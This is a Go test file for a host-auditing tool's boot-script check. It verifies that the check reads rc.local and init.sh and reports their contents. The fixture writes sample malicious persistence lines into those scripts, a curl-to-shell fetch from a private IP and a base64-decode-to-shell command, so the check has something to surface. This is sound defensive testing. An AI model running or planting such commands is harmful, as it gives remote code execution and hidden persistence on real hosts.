// The boot-script tier (rc.local, init.sh) reads a plain list of files, which is
// also its whole surface: a path dropped from the list stops appearing in the
// report with nothing else changing. One test runs the tier over a fixture on both
// sources, and one pins the catalog's own list.

package linux

import (
	"context"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"karma/internal/model"
	"karma/internal/testkit"
)

// bootScriptFixture is a directory shaped like the boot scripts: two files with a
// line a rule reads and one path that does not exist — a host without that boot
// script is the common case, and it must stay out of the report. The absent path
// leads, so the loop's status is the last existing file's: a literal path that is
// not there leaves the loop's status non-zero, and the walk stays silent about it
// because a failure with no stderr is not a finding (checked live on the test VPS,
// where none of the three boot scripts exists).
func bootScriptFixture(t *testing.T) []string {
	t.Helper()
	dir := t.TempDir()
	rcLocal := filepath.Join(dir, "rc.local")
	initSh := filepath.Join(dir, "init.sh")
	if err := os.WriteFile(rcLocal, []byte("#!/bin/sh\ncurl http://10.0.0.8/i.sh | sh\n"), 0o700); err != nil {
		t.Fatalf("write the fixture: %v", err)
	}
	if err := os.WriteFile(initSh, []byte("#!/bin/sh\nbase64 -d /etc/.x | sh\n"), 0o700); err != nil {
		t.Fatalf("write the fixture: %v", err)
	}
	return []string{filepath.Join(dir, "absent"), rcLocal, initSh}
}

// The tier the boot-script check is built from, run over a fixture: the
// in-process read, and the sh source's loop over the same list with the same
// one section per existing path.
func TestReadFilesTierReadsEveryPath(t *testing.T) {
	paths := bootScriptFixture(t)
	steps := readFilesCheck(paths...)
	if len(steps) != 2 || len(steps[0]) != 1 || len(steps[1]) != 1 {
		t.Fatalf("the read-files tier is two steps of one probe: %v", steps)
	}
	native, ok := steps[0][0].Inv.(model.Native)
	if !ok {
		t.Fatalf("the first step should carry an in-process body: %+v", steps[0][0].Inv)
	}
	sh, ok := steps[1][0].Inv.(model.Script)
	if !ok {
		t.Fatalf("the second step should carry the sh source's loop: %+v", steps[1][0].Inv)
	}
	for _, path := range paths {
		if !strings.Contains(sh.Run, path) {
			t.Fatalf("the loop does not read %s: %q", path, sh.Run)
		}
	}
	body, err := native.Body(context.Background())
	if err != nil {
		t.Fatalf("the tier failed: %v", err)
	}
	for _, want := range []string{
		"== " + paths[1], "== " + paths[2],
		"curl http://10.0.0.8/i.sh | sh", "base64 -d /etc/.x | sh",
	} {
		if !strings.Contains(body, want) {
			t.Fatalf("%q is missing from the tier's output: %q", want, body)
		}
	}
	if strings.Contains(body, paths[0]) {
		t.Fatalf("a path that does not exist should not appear in the report: %q", body)
	}
}

// The boot-script list is the one this test names: the check reads exactly these
// paths, in process and through the sh source's loop, and dropping one from the
// list is silent at run time — no fixture and no failing read would notice.
func TestBootScriptCheckCoversEveryBootScript(t *testing.T) {
	check := testkit.CheckByID(t, All, "rc-local")
	if len(check.Steps) != 2 || len(check.Steps[0]) != 1 || len(check.Steps[1]) != 1 {
		t.Fatalf("the boot-script check is two steps of one probe: %v", check.Steps)
	}
	if _, ok := check.Steps[0][0].Inv.(model.Native); !ok {
		t.Fatalf("the boot-script tier should carry an in-process body: %+v", check.Steps[0][0].Inv)
	}
	sh, ok := check.Steps[1][0].Inv.(model.Script)
	if !ok {
		t.Fatalf("the boot-script check should carry the sh source's loop: %+v", check.Steps[1][0].Inv)
	}
	want := []string{"/etc/rc.local", "/etc/rc.d/rc.local", "/etc/init.sh"}
	if !slices.Equal(bootScriptPaths, want) {
		t.Errorf("boot-script paths = %v, want %v", bootScriptPaths, want)
	}
	for _, path := range want {
		if !strings.Contains(sh.Run, path) {
			t.Errorf("the sh loop does not read %s: %q", path, sh.Run)
		}
	}
}
